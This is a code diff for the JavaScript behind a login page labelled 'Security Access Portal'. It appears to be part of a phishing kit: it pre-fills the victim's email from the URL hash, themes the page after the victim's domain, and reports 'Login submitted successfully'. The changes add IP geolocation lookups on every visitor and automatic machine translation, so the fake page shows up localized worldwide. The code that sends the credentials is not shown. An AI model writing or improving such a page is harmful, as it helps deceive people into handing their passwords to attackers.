@@ -13,10 +13,9 @@ let currentBackgroundDomain = '';
 let userLanguage = 'en';
 let translations = {};
 
-// ==================== COMPLETE TRANSLATION DICTIONARY ====================
-const translationDictionary = {
+// ==================== TRANSLATION SYSTEM ====================
+const translationStrings = {
     en: {
-        // Default English
         subtitle: "Security Access Portal",
         email_label: "Email",
         password_label: "Password",
@@ -35,215 +34,178 @@ const translationDictionary = {
         submitted_success: "Login submitted successfully",
         error_submitting: "Error submitting form. Please try again.",
         logging_into: "Logging into"
-    },
-    es: {
-        // Spanish
-        subtitle: "Portal de Acceso Seguro",
-        email_label: "Correo electrónico",
-        password_label: "Contraseña",
-        show_password: "Mostrar",
-        hide_password: "Ocultar",
-        login_button: "Iniciar sesión",
-        forgot_password: "¿Olvidaste tu contraseña?",
-        alternative_method: "Usar método alternativo",
-        encrypted_connection: "Conexión encriptada",
-        copyright: "© 2024",
-        privacy: "Privacidad",
-        terms: "Términos",
-        security: "Seguridad",
-        please_fill: "Por favor complete todos los campos",
-        sending: "Enviando...",
-        submitted_success: "Inicio de sesión enviado con éxito",
-        error_submitting: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
-        logging_into: "Iniciando sesión en"
-    },
-    fr: {
-        // French
-        subtitle: "Portail d'Accès Sécurisé",
-        email_label: "E-mail",
-        password_label: "Mot de passe",
-        show_password: "Afficher",
-        hide_password: "Masquer",
-        login_button: "Connexion",
-        forgot_password: "Mot de passe oublié?",
-        alternative_method: "Utiliser une autre méthode",
-        encrypted_connection: "Connexion chiffrée",
-        copyright: "© 2024",
-        privacy: "Confidentialité",
-        terms: "Conditions",
-        security: "Sécurité",
-        please_fill: "Veuillez remplir tous les champs",
-        sending: "Envoi en cours...",
-        submitted_success: "Connexion soumise avec succès",
-        error_submitting: "Erreur lors de l'envoi du formulaire. Veuillez réessayer.",
-        logging_into: "Connexion à"
-    },
-    de: {
-        // German
-        subtitle: "Sicherer Zugangsportal",
-        email_label: "E-Mail",
-        password_label: "Passwort",
-        show_password: "Anzeigen",
-        hide_password: "Verbergen",
-        login_button: "Anmelden",
-        forgot_password: "Passwort vergessen?",
-        alternative_method: "Alternative Methode verwenden",
-        encrypted_connection: "Verschlüsselte Verbindung",
-        copyright: "© 2024",
-        privacy: "Datenschutz",
-        terms: "Bedingungen",
-        security: "Sicherheit",
-        please_fill: "Bitte füllen Sie alle Felder aus",
-        sending: "Wird gesendet...",
-        submitted_success: "Anmeldung erfolgreich übermittelt",
-        error_submitting: "Fehler beim Senden des Formulars. Bitte versuchen Sie es erneut.",
-        logging_into: "Anmeldung bei"
-    },
-    it: {
-        // Italian
-        subtitle: "Portale di Accesso Sicuro",
-        email_label: "Email",
-        password_label: "Password",
-        show_password: "Mostra",
-        hide_password: "Nascondi",
-        login_button: "Accedi",
-        forgot_password: "Password dimenticata?",
-        alternative_method: "Usa metodo alternativo",
-        encrypted_connection: "Connessione crittografata",
-        copyright: "© 2024",
-        privacy: "Privacy",
-        terms: "Termini",
-        security: "Sicurezza",
-        please_fill: "Si prega di compilare tutti i campi",
-        sending: "Invio in corso...",
-        submitted_success: "Accesso inviato con successo",
-        error_submitting: "Errore durante l'invio del modulo. Riprova.",
-        logging_into: "Accesso a"
-    },
-    pt: {
-        // Portuguese
-        subtitle: "Portal de Acesso Seguro",
-        email_label: "E-mail",
-        password_label: "Senha",
-        show_password: "Mostrar",
-        hide_password: "Ocultar",
-        login_button: "Entrar",
-        forgot_password: "Esqueceu a senha?",
-        alternative_method: "Usar método alternativo",
-        encrypted_connection: "Conexão criptografada",
-        copyright: "© 2024",
-        privacy: "Privacidade",
-        terms: "Termos",
-        security: "Segurança",
-        please_fill: "Por favor, preencha todos os campos",
-        sending: "Enviando...",
-        submitted_success: "Login enviado com sucesso",
-        error_submitting: "Erro ao enviar o formulário. Por favor, tente novamente.",
-        logging_into: "Entrando em"
-    },
-    ru: {
-        // Russian
-        subtitle: "Безопасный портал доступа",
-        email_label: "Электронная почта",
-        password_label: "Пароль",
-        show_password: "Показать",
-        hide_password: "Скрыть",
-        login_button: "Войти",
-        forgot_password: "Забыли пароль?",
-        alternative_method: "Использовать другой метод",
-        encrypted_connection: "Зашифрованное соединение",
-        copyright: "© 2024",
-        privacy: "Конфиденциальность",
-        terms: "Условия",
-        security: "Безопасность",
-        please_fill: "Пожалуйста, заполните все поля",
-        sending: "Отправка...",
-        submitted_success: "Вход успешно отправлен",
-        error_submitting: "Ошибка отправки формы. Пожалуйста, попробуйте еще раз.",
-        logging_into: "Вход в"
-    },
-    zh: {
-        // Chinese (Simplified)
-        subtitle: "安全访问门户",
-        email_label: "电子邮件",
-        password_label: "密码",
-        show_password: "显示",
-        hide_password: "隐藏",
-        login_button: "登录",
-        forgot_password: "忘记密码？",
-        alternative_method: "使用其他方法",
-        encrypted_connection: "加密连接",
-        copyright: "© 2024",
-        privacy: "隐私",
-        terms: "条款",
-        security: "安全",
-        please_fill: "请填写所有字段",
-        sending: "发送中...",
-        submitted_success: "登录提交成功",
-        error_submitting: "提交表单时出错。请再试一次。",
-        logging_into: "登录到"
-    },
-    ja: {
-        // Japanese
-        subtitle: "セキュアアクセスポータル",
-        email_label: "メールアドレス",
-        password_label: "パスワード",
-        show_password: "表示",
-        hide_password: "非表示",
-        login_button: "ログイン",
-        forgot_password: "パスワードをお忘れですか？",
-        alternative_method: "別の方法を使用",
-        encrypted_connection: "暗号化された接続",
-        copyright: "© 2024",
-        privacy: "プライバシー",
-        terms: "利用規約",
-        security: "セキュリティ",
-        please_fill: "すべての項目を入力してください",
-        sending: "送信中...",
-        submitted_success: "ログインが正常に送信されました",
-        error_submitting: "フォームの送信中にエラーが発生しました。もう一度お試しください。",
-        logging_into: "ログイン中"
-    },
-    ko: {
-        // Korean
-        subtitle: "보안 액세스 포털",
-        email_label: "이메일",
-        password_label: "비밀번호",
-        show_password: "표시",
-        hide_password: "숨기기",
-        login_button: "로그인",
-        forgot_password: "비밀번호를 잊으셨나요?",
-        alternative_method: "다른 방법 사용",
-        encrypted_connection: "암호화된 연결",
-        copyright: "© 2024",
-        privacy: "개인정보",
-        terms: "이용약관",
-        security: "보안",
-        please_fill: "모든 필드를 채워주세요",
-        sending: "전송 중...",
-        submitted_success: "로그인이 성공적으로 제출되었습니다",
-        error_submitting: "폼 제출 중 오류가 발생했습니다. 다시 시도해 주세요.",
-        logging_into: "로그인 중"
     }
 };
 
-// Get user language from browser
-function detectUserLanguage() {
-    // Get browser language
-    const browserLang = navigator.language || navigator.userLanguage || 'en';
-    const langCode = browserLang.split('-')[0].toLowerCase();
+// WORKING IP DETECTION - Uses reliable services
+async function detectUserLanguage() {
+    // Try multiple reliable IP detection services
+    const services = [
+        {
+            name: 'ipapi',
+            url: 'https://ipapi.co/json/',
+            getCountry: (data) => data.country_code
+        },
+        {
+            name: 'ipapi.co (alternative)',
+            url: 'https://ipapi.co/country/',
+            getCountry: (data) => data.trim()
+        },
+        {
+            name: 'ipify',
+            url: 'https://api.ipify.org?format=json',
+            getIp: (data) => data.ip,
+            thenUrl: (ip) => `https://ipapi.co/${ip}/json/`,
+            getCountry: (data) => data.country_code
+        },
+        {
+            name: 'geoplugin',
+            url: 'http://www.geoplugin.net/json.gp',
+            getCountry: (data) => data.geoplugin_countryCode
+        }
+    ];
     
-    console.log('Browser language:', browserLang, 'Code:', langCode);
-    
-    // Check if we have translations for this language
-    if (translationDictionary[langCode]) {
-        return langCode;
+    for (const service of services) {
+        try {
+            console.log(`Trying IP service: ${service.name}`);
+            
+            let response;
+            if (service.getIp) {
+                // Two-step process: Get IP first, then get location
+                const ipResponse = await fetch(service.url, { 
+                    signal: AbortSignal.timeout(3000) 
+                });
+                if (!ipResponse.ok) continue;
+                
+                const ipData = await ipResponse.json();
+                const ip = service.getIp(ipData);
+                
+                const locationResponse = await fetch(service.thenUrl(ip), { 
+                    signal: AbortSignal.timeout(3000) 
+                });
+                if (!locationResponse.ok) continue;
+                
+                response = locationResponse;
+            } else {
+                // Direct location service
+                response = await fetch(service.url, { 
+                    signal: AbortSignal.timeout(3000) 
+                });
+                if (!response.ok) continue;
+            }
+            
+            const data = await response.json();
+            const countryCode = service.getCountry(data);
+            
+            if (countryCode && countryCode.length === 2) {
+                console.log(`Found country code: ${countryCode} from ${service.name}`);
+                const language = mapCountryToLanguage(countryCode);
+                console.log(`Mapped to language: ${language}`);
+                return language;
+            }
+            
+        } catch (error) {
+            console.log(`Service ${service.name} failed:`, error.message);
+            continue;
+        }
     }
     
-    return 'en'; // Default to English
+    // Fallback: Use browser language
+    console.log('All IP services failed, using browser language');
+    const browserLang = navigator.language || navigator.userLanguage || 'en';
+    return browserLang.split('-')[0];
 }
 
-// Get language display name
+// Map country codes to languages
+function mapCountryToLanguage(countryCode) {
+    const countryToLang = {
+        // English
+        'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
+        'IE': 'en', 'SG': 'en', 'IN': 'en', 'ZA': 'en', 'PH': 'en',
+        
+        // Spanish
+        'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
+        'VE': 'es', 'CL': 'es', 'EC': 'es', 'GT': 'es', 'CU': 'es',
+        'DO': 'es', 'HN': 'es', 'BO': 'es', 'SV': 'es', 'NI': 'es',
+        'PY': 'es', 'CR': 'es', 'PR': 'es', 'UY': 'es', 'PA': 'es',
+        
+        // French
+        'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'LU': 'fr', 'CA': 'fr',
+        'MC': 'fr', 'SN': 'fr', 'CI': 'fr', 'CM': 'fr', 'MG': 'fr',
+        
+        // German
+        'DE': 'de', 'AT': 'de', 'CH': 'de', 'LI': 'de', 'LU': 'de',
+        
+        // Portuguese
+        'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
+        
+        // Italian
+        'IT': 'it', 'SM': 'it', 'VA': 'it', 'CH': 'it',
+        
+        // Russian
+        'RU': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
+        
+        // Chinese
+        'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh', 'SG': 'zh',
+        
+        // Japanese
+        'JP': 'ja',
+        
+        // Korean
+        'KR': 'ko',
+        
+        // Arabic
+        'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'DZ': 'ar', 'MA': 'ar',
+        'IQ': 'ar', 'SD': 'ar', 'SY': 'ar', 'TN': 'ar', 'JO': 'ar',
+        'LB': 'ar', 'LY': 'ar', 'OM': 'ar', 'KW': 'ar', 'QA': 'ar',
+        'BH': 'ar',
+        
+        // Turkish
+        'TR': 'tr',
+        
+        // Dutch
+        'NL': 'nl', 'BE': 'nl',
+        
+        // Swedish
+        'SE': 'sv',
+        
+        // Norwegian
+        'NO': 'no',
+        
+        // Danish
+        'DK': 'da',
+        
+        // Polish
+        'PL': 'pl',
+        
+        // Czech
+        'CZ': 'cs',
+        
+        // Greek
+        'GR': 'el', 'CY': 'el',
+        
+        // Hebrew
+        'IL': 'he',
+        
+        // Hindi
+        'IN': 'hi',
+        
+        // Thai
+        'TH': 'th',
+        
+        // Vietnamese
+        'VN': 'vi',
+        
+        // Indonesian
+        'ID': 'id'
+    };
+    
+    const lang = countryToLang[countryCode] || 'en';
+    console.log(`Country ${countryCode} -> Language ${lang}`);
+    return lang;
+}
+
+// Get language name for display
 function getLanguageName(langCode) {
     const languageNames = {
         'en': 'English',
@@ -257,39 +219,131 @@ function getLanguageName(langCode) {
         'ja': '日本語',
         'ko': '한국어',
         'ar': 'العربية',
-        'hi': 'हिन्दी'
+        'hi': 'हिन्दी',
+        'nl': 'Nederlands',
+        'sv': 'Svenska',
+        'no': 'Norsk',
+        'da': 'Dansk',
+        'pl': 'Polski',
+        'cs': 'Čeština',
+        'el': 'Ελληνικά',
+        'he': 'עברית',
+        'th': 'ไทย',
+        'vi': 'Tiếng Việt',
+        'id': 'Bahasa Indonesia',
+        'tr': 'Türkçe'
     };
     
     return languageNames[langCode] || langCode.toUpperCase();
 }
 
-// Translate the entire page
-function translatePage(lang) {
-    if (lang === 'en' || !translationDictionary[lang]) {
-        // Use English
-        translations = { ...translationDictionary.en };
+// Translate page using working translation service
+async function translatePage(lang) {
+    if (lang === 'en' || !lang) {
         updateLanguageButton('en');
         return;
     }
     
-    console.log('Translating page to:', lang);
+    console.log(`Starting translation to ${lang}`);
     
-    // Get translations for selected language
-    const langTranslations = translationDictionary[lang];
-    translations = { ...langTranslations };
-    
-    // Update all elements with data-i18n attribute
     const elements = document.querySelectorAll('[data-i18n]');
+    const textsToTranslate = [];
+    const elementMap = [];
     
+    // Collect texts
     elements.forEach(el => {
         const key = el.getAttribute('data-i18n');
-        if (langTranslations[key]) {
-            el.textContent = langTranslations[key];
+        if (translationStrings.en[key]) {
+            textsToTranslate.push(translationStrings.en[key]);
+            elementMap.push({ element: el, key: key });
         }
     });
     
-    // Update language button
+    if (textsToTranslate.length === 0) return;
+    
+    try {
+        // Use MyMemory Translation API (free, reliable)
+        const translatedTexts = await translateWithMyMemory(textsToTranslate, lang);
+        
+        if (translatedTexts.length === textsToTranslate.length) {
+            // Apply translations
+            elementMap.forEach((item, index) => {
+                if (translatedTexts[index]) {
+                    item.element.textContent = translatedTexts[index];
+                }
+            });
+            
+            // Update translations object
+            updateTranslationsObject(textsToTranslate, translatedTexts);
+            
+            console.log(`Successfully translated to ${lang}`);
+        }
+        
+    } catch (error) {
+        console.log('Translation failed:', error);
+        // Still update button even if translation fails
+    }
+    
+    // Always update the language button
     updateLanguageButton(lang);
+}
+
+// Use MyMemory Translation API (free tier)
+async function translateWithMyMemory(texts, targetLang) {
+    console.log(`Translating ${texts.length} texts to ${targetLang}`);
+    
+    const translatedTexts = [];
+    
+    // Translate each text individually (MyMemory handles single strings better)
+    for (const text of texts) {
+        try {
+            const encodedText = encodeURIComponent(text);
+            const url = `https://api.mymemory.translated.net/get?q=${encodedText}&langpair=en|${targetLang}`;
+            
+            const response = await fetch(url, {
+                signal: AbortSignal.timeout(5000)
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                const translated = data.responseData.translatedText;
+                
+                if (translated && translated !== 'PLEASE SELECT TWO DISTINCT LANGUAGES') {
+                    translatedTexts.push(translated);
+                } else {
+                    translatedTexts.push(text); // Fallback to original
+                }
+            } else {
+                translatedTexts.push(text); // Fallback to original
+            }
+            
+            // Small delay to avoid rate limiting
+            await new Promise(resolve => setTimeout(resolve, 100));
+            
+        } catch (error) {
+            console.log(`Failed to translate: "${text}"`, error);
+            translatedTexts.push(text); // Fallback to original
+        }
+    }
+    
+    return translatedTexts;
+}
+
+// Update translations object
+function updateTranslationsObject(originalTexts, translatedTexts) {
+    // Find and update specific translations
+    const findTranslation = (searchText) => {
+        const index = originalTexts.indexOf(searchText);
+        return index !== -1 ? translatedTexts[index] : searchText;
+    };
+    
+    translations.logging_into = findTranslation("Logging into");
+    translations.please_fill = findTranslation("Please fill in all fields");
+    translations.sending = findTranslation("Sending...");
+    translations.submitted_success = findTranslation("Login submitted successfully");
+    translations.error_submitting = findTranslation("Error submitting form. Please try again.");
+    translations.show_password = findTranslation("Show");
+    translations.hide_password = findTranslation("Hide");
 }
 
 function updateLanguageButton(lang) {
@@ -297,6 +351,7 @@ function updateLanguageButton(lang) {
     if (!langBtn) return;
     
     langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
+    console.log(`Language button updated to: ${getLanguageName(lang)}`);
 }
 
 function setupLanguageToggle() {
@@ -305,20 +360,21 @@ function setupLanguageToggle() {
     
     langBtn.addEventListener('click', async () => {
         if (userLanguage === 'en') {
-            // Detect language
-            const detectedLang = detectUserLanguage();
-            if (detectedLang !== 'en' && translationDictionary[detectedLang]) {
+            // Switch to detected language
+            const detectedLang = await detectUserLanguage();
+            console.log(`Toggle: Switching to detected language: ${detectedLang}`);
+            
+            if (detectedLang !== 'en') {
                 userLanguage = detectedLang;
-                translatePage(detectedLang);
+                await translatePage(detectedLang);
             } else {
-                // Try Spanish as default test language
-                userLanguage = 'es';
-                translatePage('es');
+                alert('IP detection shows you are in an English-speaking country. Try using a VPN to test other languages.');
             }
         } else {
             // Switch back to English
+            console.log('Toggle: Switching back to English');
             userLanguage = 'en';
-            translatePage('en');
+            location.reload();
         }
     });
 }
@@ -688,25 +744,36 @@ function setupPasswordToggle() {
 
 // ==================== INITIALIZATION ====================
 async function initialize() {
-    // Initialize with English translations
-    translations = { ...translationDictionary.en };
+    translations = { ...translationStrings.en };
     
     setupFormHandling();
     setupEmailInputListener();
     setupPasswordToggle();
     setupLanguageToggle();
     
-    // Auto-detect and apply language on page load
-    const detectedLang = detectUserLanguage();
-    userLanguage = detectedLang;
+    // Auto-detect language from IP on page load
+    try {
+        console.log('Starting IP-based language detection...');
+        const detectedLang = await detectUserLanguage();
+        console.log(`Detected language: ${detectedLang}`);
+        
+        userLanguage = detectedLang;
+        
+        // Update language button immediately
+        updateLanguageButton(detectedLang);
+        
+        // If not English, translate the page
+        if (detectedLang !== 'en') {
+            await translatePage(detectedLang);
+        }
+        
+    } catch (error) {
+        console.error('IP detection failed:', error);
+        updateLanguageButton('en');
+    }
     
-    // Translate page to detected language
-    translatePage(detectedLang);
-    
-    // Extract email from URL hash
     await extractAndSetEmailFromHash();
     
-    // If no email in hash, use default background
     if (!currentBackgroundDomain) {
         createThemedBackground('Secure Portal');
     }
